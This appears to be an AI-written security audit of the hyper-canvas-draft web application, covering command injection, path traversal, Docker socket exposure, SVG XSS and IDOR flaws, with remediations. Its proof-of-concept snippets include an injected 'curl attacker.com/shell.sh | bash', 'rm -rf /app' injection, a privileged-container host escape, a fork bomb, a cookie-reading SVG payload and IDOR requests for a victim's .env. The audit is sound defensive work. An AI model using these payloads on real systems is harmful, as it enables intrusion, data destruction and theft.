# Security Audit Report: hyper-canvas-draft

**Date:** December 13, 2025
**Auditor:** Claude (Automated Security Assessment)
**Scope:** Full application security review before production deployment
**Classification:** CONFIDENTIAL

---

## Executive Summary

This security audit of hyper-canvas-draft identified **5 CRITICAL**, **4 HIGH**, and **3 MEDIUM** severity vulnerabilities. The most severe issues involve **command injection** in Docker management, **path traversal** in file operations, and **insufficient container isolation**.

**Key Finding:** JWT authentication is properly implemented and secure. Token tampering attacks are not possible without knowledge of the `JWT_SECRET`.

**Immediate Action Required:** Critical vulnerabilities in `docker-manager.ts` and `runTests.ts` allow arbitrary command execution and must be fixed before any production deployment.

---

## Vulnerability Summary

| ID | Severity | Category | Location | CVSS Est. |
|----|----------|----------|----------|-----------|
| VULN-001 | CRITICAL | Command Injection | `docker-manager.ts:109-118` | 9.8 |
| VULN-002 | CRITICAL | Shell Injection | `runTests.ts:49-62` | 9.8 |
| VULN-003 | CRITICAL | Path Traversal | `listImages.ts:123-128` | 8.6 |
| VULN-004 | CRITICAL | Missing Resource Limits | `docker-manager.ts` | 7.5 |
| VULN-005 | CRITICAL | Docker Socket Exposure | `Dockerfile`, `k8s/` | 9.0 |
| VULN-006 | HIGH | Path Traversal | `main.ts:56-90` (WebSocket) | 7.5 |
| VULN-007 | HIGH | Command Injection | `docker-manager.ts:140-145` | 8.1 |
| VULN-008 | HIGH | XSS via SVG | `uploadImage.ts` | 6.1 |
| VULN-009 | HIGH | Input Validation | `canvasComposition.ts` | 6.5 |
| VULN-010 | MEDIUM | Rate Limiting | Global | 5.3 |
| VULN-011 | MEDIUM | Symlink Attack | `readFile.ts`, `writeFile.ts` | 5.5 |
| VULN-012 | MEDIUM | Parameter Pollution | `writeFile.ts` | 4.3 |
| VULN-015 | ✅ FIXED | IDOR | Multiple routes (see below) | 8.5 |
| VULN-016 | MEDIUM | Weak Random | `user-settings.ts:99` | 4.5 |
| VULN-017 | MEDIUM | Rate Limiting | `/api/user/email/verify*` | 5.3 |

---

## Detailed Findings

### VULN-001: Command Injection in Docker Container Startup

**Severity:** CRITICAL
**Location:** `server/services/docker-manager.ts` lines 109-118
**CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)

#### Description

User-controlled values are interpolated directly into shell commands via template strings without proper sanitization.

#### Vulnerable Code

```typescript
const { stdout } = await execAsync(`
  docker run -d \
    --name ${containerName} \
    -v "${project.path}:/app" \
    -p ${project.port}:${project.internalPort} \
    -e INSTALL_COMMAND="${project.installCommand}" \
    -e DEV_COMMAND="${devCommand}" \
    ${basePathEnv} \
    ${imageName}
`);
```

#### Proof of Concept

If an attacker can control `project.installCommand` (e.g., through database manipulation or API parameter injection):

```
installCommand: "npm install"; curl attacker.com/shell.sh | bash #"
```

Results in:
```bash
docker run -d ... -e INSTALL_COMMAND="npm install"; curl attacker.com/shell.sh | bash #"
```

The shell interprets `;` as command separator, executing arbitrary commands on the host.

#### Attack Vector

1. Attacker creates/modifies project with malicious `installCommand`
2. Container starts via `startProjectContainer()`
3. Shell executes injected commands with host privileges

#### Remediation

Replace `execAsync()` with `spawn()` using array arguments:

```typescript
import { spawn } from 'node:child_process';

const args = [
  'run', '-d',
  '--name', containerName,
  '-v', `${project.path}:/app`,
  '-p', `${project.port}:${project.internalPort}`,
  '-e', `INSTALL_COMMAND=${project.installCommand}`,
  '-e', `DEV_COMMAND=${devCommand}`,
  imageName
];

const process = spawn('docker', args);
```

---

### VULN-002: Shell Injection in Test Runner

**Severity:** CRITICAL
**Location:** `server/routes/runTests.ts` lines 49-62
**CWE:** CWE-78 (OS Command Injection)

#### Description

Test file paths are concatenated into a shell command string and executed via `docker exec sh -c`.

#### Vulnerable Code

```typescript
function buildTestCommand(runner: 'vitest' | 'jest' | 'bun', testPaths: string[]): string {
  const pathsArg = testPaths.map((p) => `"${p}"`).join(' ');

  switch (runner) {
    case 'vitest':
      return `npx vitest run --reporter=verbose ${pathsArg}`;
    // ...
  }
}

// Later executed as:
spawn('docker', ['exec', containerName, 'sh', '-c', command]);
```

#### Proof of Concept

```
POST /api/run-tests
{
  "testPaths": ["test.ts\"; rm -rf /app #"]
}
```

Generates command:
```bash
npx vitest run --reporter=verbose "test.ts"; rm -rf /app #"
```

#### Remediation

Pass arguments directly without shell interpretation:

```typescript
const args = ['exec', containerName, 'npx', 'vitest', 'run', '--reporter=verbose', ...testPaths];
spawn('docker', args);
```

---

### VULN-003: Path Traversal in Image Listing

**Severity:** CRITICAL
**Location:** `server/routes/listImages.ts` lines 123-128
**CWE:** CWE-22 (Path Traversal)

#### Description

The `subdirectory` query parameter is not validated, allowing traversal outside the intended directory.

#### Vulnerable Code

```typescript
const scanPath = subdirectory
  ? join(publicDirPath, subdirectory)
  : publicDirPath;

const images = await scanForImages(scanPath, publicDirPath);
```

#### Proof of Concept

```
GET /api/projects/{id}/images?subdirectory=../../../etc
```

This resolves to `/etc` on the host filesystem, potentially exposing sensitive files.

#### Remediation

```typescript
const normalizedSubdir = path.normalize(subdirectory).replace(/^(\.\.[\/\\])+/, '');
const scanPath = path.join(publicDirPath, normalizedSubdir);
const resolvedScan = path.resolve(scanPath);
const resolvedBase = path.resolve(publicDirPath);

if (!resolvedScan.startsWith(resolvedBase)) {
  return c.json({ error: 'Access denied: path traversal detected' }, 403);
}
```

---

### VULN-004: Missing Docker Resource Limits

**Severity:** CRITICAL
**Location:** `server/services/docker-manager.ts` lines 109-118
**CWE:** CWE-770 (Allocation of Resources Without Limits)

#### Description

User project containers are started without memory, CPU, or process limits, enabling denial-of-service attacks.

#### Current Configuration

```typescript
docker run -d \
  --name ${containerName} \
  -v "${project.path}:/app" \
  -p ${project.port}:${project.internalPort} \
  // NO RESOURCE LIMITS
```

#### Attack Scenario

1. Attacker creates project with fork bomb or memory exhaustion code
2. Container consumes all host resources
3. Host system becomes unresponsive (DoS)

#### Proof of Concept

Project code:
```javascript
// Fork bomb
while(true) { require('child_process').fork(__filename); }

// Memory exhaustion
const data = [];
while(true) { data.push(new Array(1000000).fill('x')); }
```

#### Remediation

Add resource limits to container startup:

```typescript
const args = [
  'run', '-d',
  '--name', containerName,
  '--memory=1g',
  '--memory-swap=1g',
  '--cpus=2',
  '--pids-limit=200',
  '--security-opt=no-new-privileges',
  '--cap-drop=ALL',
  '--cap-add=CHOWN',
  '--cap-add=SETUID',
  '--cap-add=SETGID',
  '-v', `${project.path}:/app`,
  '-p', `${project.port}:${project.internalPort}`,
  imageName
];
```

---

### VULN-005: Docker Socket Exposure

**Severity:** CRITICAL
**Location:** `Dockerfile` line 49-50, `k8s/base/hypercanvas.yaml` lines 78-88
**CWE:** CWE-250 (Execution with Unnecessary Privileges)

#### Description

The Docker socket (`/var/run/docker.sock`) is mounted into the main application container, and the container runs as root. This allows container escape to full host access.

#### Vulnerable Configuration

```dockerfile
# Dockerfile
# Run as non-root user (commented out for Docker socket access)
# USER hypercanvas
```

```yaml
# k8s/base/hypercanvas.yaml
volumeMounts:
  - name: docker-socket
    mountPath: /var/run/docker.sock
volumes:
  - name: docker-socket
    hostPath:
      path: /var/run/docker.sock
securityContext:
  runAsUser: 0  # ROOT
```

#### Attack Scenario

1. Attacker exploits any vulnerability to execute code in main container
2. Uses Docker socket to spawn privileged container:
   ```bash
   docker run -v /:/host --privileged -it alpine chroot /host
   ```
3. Gains full root access to host filesystem

#### Remediation

**Option A:** Use Docker API over TCP with TLS authentication
**Option B:** Use Docker-in-Docker (dind) in separate container
**Option C:** Use container orchestration without socket access (Kubernetes with limited RBAC)

```yaml
# If socket access is required, use restricted access:
securityContext:
  runAsUser: 1001
  runAsGroup: 999  # docker group
  readOnlyRootFilesystem: true
```

---

### VULN-006: Path Traversal in WebSocket Proxy

**Severity:** HIGH
**Location:** `server/main.ts` lines 56-90
**CWE:** CWE-22 (Path Traversal)

#### Description

WebSocket path is stored and forwarded without complete validation, potentially allowing access to unintended backend paths.

#### Vulnerable Code

```typescript
const projectIdMatch = pathname.match(/^\/project-preview\/([a-f0-9-]+)/);
if (!projectIdMatch) {
  return new Response("Invalid project path", { status: 400 });
}
const projectId = projectIdMatch[1];
const path: string = pathname + url.search;  // Stored as-is

// Later:
const backendUrl = `ws://localhost:${data.projectPort}${data.path}`;
```

#### Proof of Concept

```
WS /project-preview/valid-uuid-here/../../../admin/ws
```

The regex only validates the beginning of the path, not what follows.

#### Remediation

```typescript
// Validate entire path structure
const pathAfterProject = pathname.slice(projectIdMatch[0].length);
if (pathAfterProject.includes('..') || pathAfterProject.includes('//')) {
  return new Response("Invalid path", { status: 400 });
}
```

---

### VULN-007: Command Injection in Artifact Cleanup

**Severity:** HIGH
**Location:** `server/services/docker-manager.ts` lines 140-145
**CWE:** CWE-78 (OS Command Injection)

#### Vulnerable Code

```typescript
const artifacts = ['.next', 'dist', '.vite', 'out'];
const paths = artifacts.map(a => `"${project.path}/${a}"`).join(' ');
await execAsync(`rm -rf ${paths}`);
```

#### Proof of Concept

If `project.path` contains backticks:
```
project.path: "/projects/test`id`"
```

Results in command substitution, executing `id` command.

#### Remediation

```typescript
import { rm } from 'node:fs/promises';

for (const artifact of artifacts) {
  const artifactPath = path.join(project.path, artifact);
  await rm(artifactPath, { recursive: true, force: true });
}
```

---

### VULN-008: XSS via SVG Upload

**Severity:** HIGH
**Location:** `server/routes/uploadImage.ts`
**CWE:** CWE-79 (Cross-site Scripting)

#### Description

SVG files can contain JavaScript that executes when the image is viewed.

#### Proof of Concept

Upload SVG with:
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <rect width="100" height="100"/>
</svg>
```

When served with `Content-Type: image/svg+xml`, the script executes in user's browser.

#### Remediation

1. Sanitize SVG files using DOMPurify
2. Serve uploaded files with `Content-Disposition: attachment`
3. Use Content Security Policy headers
4. Or: reject SVG uploads entirely

```typescript
import createDOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

if (file.type === 'image/svg+xml') {
  const cleanSvg = DOMPurify.sanitize(svgContent, { USE_PROFILES: { svg: true } });
  // Save cleanSvg instead of original
}
```

---

### VULN-009: Missing Input Validation on Component Paths

**Severity:** HIGH
**Location:** `server/routes/canvasComposition.ts` lines 74-114
**CWE:** CWE-20 (Improper Input Validation)

#### Description

`componentPath` parameter is used directly without validation against expected format.

#### Remediation

```typescript
const VALID_COMPONENT_PATH = /^[a-zA-Z0-9_\-\/]+\.(tsx?|jsx?)$/;
if (!VALID_COMPONENT_PATH.test(decodedComponentPath)) {
  return c.json({ error: 'Invalid component path format' }, 400);
}
```

---

### VULN-010: Missing Rate Limiting

**Severity:** MEDIUM
**Location:** Global (all API endpoints)
**CWE:** CWE-770 (Resource Exhaustion)

#### Description

No rate limiting on API endpoints allows brute force and DoS attacks.

#### Remediation

```typescript
import { rateLimiter } from 'hono-rate-limiter';

app.use('/api/*', rateLimiter({
  windowMs: 60 * 1000, // 1 minute
  limit: 100,
  keyGenerator: (c) => c.req.header('x-forwarded-for') || 'anonymous',
}));
```

---

### VULN-011: Symlink Attack Potential

**Severity:** MEDIUM
**Location:** `server/routes/readFile.ts`, `server/routes/writeFile.ts`
**CWE:** CWE-59 (Improper Link Resolution)

#### Description

Path validation uses `path.resolve()` which doesn't resolve symlinks, potentially allowing symlink-based escapes.

#### Remediation

```typescript
import { realpath } from 'node:fs/promises';

const resolvedPath = await realpath(fullPath);
const resolvedBase = await realpath(projectPath);
if (!resolvedPath.startsWith(resolvedBase)) {
  return c.json({ error: 'Access denied' }, 403);
}
```

---

### VULN-012: Client-Controlled Project Path

**Severity:** MEDIUM
**Location:** `server/routes/writeFile.ts` line 19
**CWE:** CWE-639 (Authorization Bypass)

#### Description

Client can specify `projectPath` in request body, potentially accessing other projects.

#### Vulnerable Code

```typescript
const { path: filePath, content, projectPath: requestProjectPath } = await c.req.json();
```

#### Remediation

Always derive `projectPath` from authenticated user's project, never from client input:

```typescript
const project = await getProjectById(projectId, userId);
const projectPath = project.path; // From database, not request
```

---

## Security Assessment: JWT Authentication

**Status:** SECURE

The JWT implementation was specifically audited per user request. Findings:

### Architecture

- **Library:** `jose` (modern, actively maintained)
- **Algorithm:** HS256 (HMAC SHA-256)
- **Secret:** `JWT_SECRET` environment variable (required, not hardcoded)

### Token Types

| Type | Storage | TTL | Claims |
|------|---------|-----|--------|
| Access Token | Memory (Zustand) | 15 min | sub, email, type |
| Refresh Token | httpOnly Cookie + DB hash | 7 days | sub, jti, type |

### Security Controls

1. **Signature Verification:** Every request validates JWT signature via `jwtVerify()`
2. **Type Checking:** Tokens have `type` claim to prevent token confusion
3. **User Validation:** After JWT verification, user existence is checked in DB
4. **Deleted Account Check:** Deleted users cannot use existing tokens
5. **Token Revocation:** Refresh tokens stored as SHA-256 hash in DB with revocation support
6. **Cookie Security:** `httpOnly`, `secure` (production), `sameSite: lax`

### Attack Analysis

**Q: Can an attacker modify the JWT payload to impersonate another user?**

**A: No.** The HS256 signature covers the entire payload. Any modification invalidates the signature, and `jwtVerify()` will reject the token. Without knowledge of `JWT_SECRET`, forging a valid signature is computationally infeasible.

---

## Recommendations Priority Matrix

### Immediate (Before Production)

1. Fix VULN-001: Command Injection in docker-manager.ts
2. Fix VULN-002: Shell Injection in runTests.ts
3. Fix VULN-003: Path Traversal in listImages.ts
4. Fix VULN-004: Add Docker resource limits

### Short-term (Within 1 Week)

5. Fix VULN-005: Address Docker socket exposure
6. Fix VULN-006: WebSocket path validation
7. Fix VULN-007: Artifact cleanup command injection
8. Fix VULN-008: SVG sanitization

### Medium-term (Within 1 Month)

9. Fix VULN-009: Component path validation
10. Fix VULN-010: Implement rate limiting
11. Fix VULN-011: Symlink resolution
12. Fix VULN-012: Server-side project path resolution

---

## Files Requiring Modification

| File | Vulnerabilities |
|------|-----------------|
| `server/services/docker-manager.ts` | VULN-001, VULN-004, VULN-007 |
| `server/routes/runTests.ts` | VULN-002 |
| `server/routes/listImages.ts` | VULN-003 |
| `server/main.ts` | VULN-006 |
| `server/routes/uploadImage.ts` | VULN-008 |
| `server/routes/canvasComposition.ts` | VULN-009 |
| `server/routes/readFile.ts` | VULN-011 |
| `server/routes/writeFile.ts` | VULN-011, VULN-012 |
| `Dockerfile` | VULN-005 |
| `k8s/base/hypercanvas.yaml` | VULN-005 |

---

## Appendix A: Test Commands for Verification

```bash
# Test VULN-001 (Command Injection) - DO NOT RUN IN PRODUCTION
# Create project with malicious installCommand via API/DB

# Test VULN-003 (Path Traversal)
curl "http://localhost:8080/api/projects/{id}/images?subdirectory=../../../etc"

# Test VULN-006 (WebSocket Path Traversal)
wscat -c "ws://localhost:8080/project-preview/{id}/../../../admin"

# Test VULN-008 (SVG XSS)
# Upload SVG with onload handler, then view it
```

---

## Update: December 18, 2025

### Fixed Vulnerabilities

| ID | Status | Fix |
|----|--------|-----|
| VULN-010 | ✅ FIXED | Rate limiting via Traefik IngressRoutes |
| VULN-016 | ✅ FIXED | Replaced `Math.random()` with `node:crypto` |
| VULN-017 | ✅ FIXED | Rate limiting for email verification endpoint |

---

### VULN-015: IDOR (Insecure Direct Object Reference)

**Severity:** CRITICAL
**Status:** ✅ FIXED (10601173)
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

Multiple API endpoints accept resource IDs (projectId, chatId, etc.) without verifying that the authenticated user has access to those resources.

**Affected Endpoints:**

| Endpoint | Risk | Issue |
|----------|------|-------|
| `GET /api/ai-agent/chats` | CRITICAL | Access any project's chats |
| `GET /api/ai-agent/chats/:chatId/messages` | CRITICAL | Read any chat's messages |
| `DELETE /api/ai-agent/chats/:chatId` | CRITICAL | Delete any chat |
| `POST /api/ai-agent/chat` | CRITICAL | Send messages to any project |
| `GET /api/auto-fix/:sessionId` | CRITICAL | Access any fix session |
| `GET /api/auto-fix/project/:projectId` | CRITICAL | Access any project's sessions |
| `GET /api/ai-config` | CRITICAL | Read any workspace's AI config |
| `PUT /api/ai-config` | CRITICAL | Modify any workspace's AI config |
| `POST /api/docker/start/:id` | CRITICAL | Start any project's container |
| `POST /api/docker/stop/:id` | CRITICAL | Stop any project's container |
| `GET /api/docker/logs/:id` | CRITICAL | Read any project's logs |
| `GET /api/read-file` | CRITICAL | Read files from any project |
| `POST /api/write-file` | CRITICAL | Write files to any project |
| `GET /api/git/*` | HIGH | Git operations on any project |
| `*  /api/canvas-composition/*` | HIGH | No authMiddleware |
| `*  /api/sample-renderer/*` | HIGH | No authMiddleware |
| 20+ legacy routes | HIGH | No authMiddleware |

**Proof of Concept:**

```bash
# Attacker reads victim's AI chat history
curl -H "Authorization: Bearer $ATTACKER_TOKEN" \
  "https://app.example.com/api/ai-agent/chats?projectId=VICTIM_PROJECT_UUID"

# Attacker reads victim's files
curl -H "Authorization: Bearer $ATTACKER_TOKEN" \
  "https://app.example.com/api/read-file?projectPath=/victim/project&filePath=.env"

# Attacker stops victim's container
curl -X POST -H "Authorization: Bearer $ATTACKER_TOKEN" \
  "https://app.example.com/api/docker/stop/VICTIM_PROJECT_UUID"
```

**Root Cause:**

1. Many routes don't use `authMiddleware` at all
2. Routes that use `authMiddleware` don't verify workspace/project ownership
3. Pattern: `getProject(id)` checks if project exists, not if user can access it

**Remediation Steps:**

1. Add `authMiddleware` to all protected routes

2. Add workspace access check helper:

```typescript
// server/middleware/workspace-access.ts
export async function checkWorkspaceAccess(userId: string, workspaceId: string): Promise<boolean> {
  const membership = await db.query.workspaceMembers.findFirst({
    where: and(
      eq(workspaceMembers.userId, userId),
      eq(workspaceMembers.workspaceId, workspaceId)
    ),
  });
  return !!membership;
}
```

1. Apply check in every route handler:

```typescript
const userId = c.get('userId');
const project = await getProject(projectId);
if (!project) return c.json({ error: 'Not found' }, 404);

const hasAccess = await checkWorkspaceAccess(userId, project.workspaceId);
if (!hasAccess) return c.json({ error: 'Access denied' }, 403);
```

1. Consider using RLS (Row Level Security) in PostgreSQL as defense-in-depth

**Files Modified (commit 10601173):**

| File | Changes Made |
|------|--------------|
| `server/middleware/workspace.ts` | Added checkProjectAccess, checkWorkspaceAccess helpers |
| `server/routes/ai-agent-chats.ts` | ✅ Added workspace checks to all 5 handlers |
| `server/routes/ai-agent.ts` | ✅ Added workspace check to chat handler |
| `server/routes/autoFix.ts` | ✅ Added access checks to all 6 handlers |
| `server/routes/generatePreview.ts` | ✅ Added access checks to AI config endpoints |
| `server/routes/docker.ts` | ✅ Added access checks to all container handlers |
| `server/index.ts` | ✅ Added authMiddleware to Docker/AI/Auto-Fix routes |

**Remaining (lower priority):**

| File | Status |
|------|--------|
| `server/routes/comments.ts` | Uses workspace routing |
| `server/routes/subscriptions.ts` | Uses workspace routing |
| Legacy component routes | No user data exposure |

---

**End of Report**
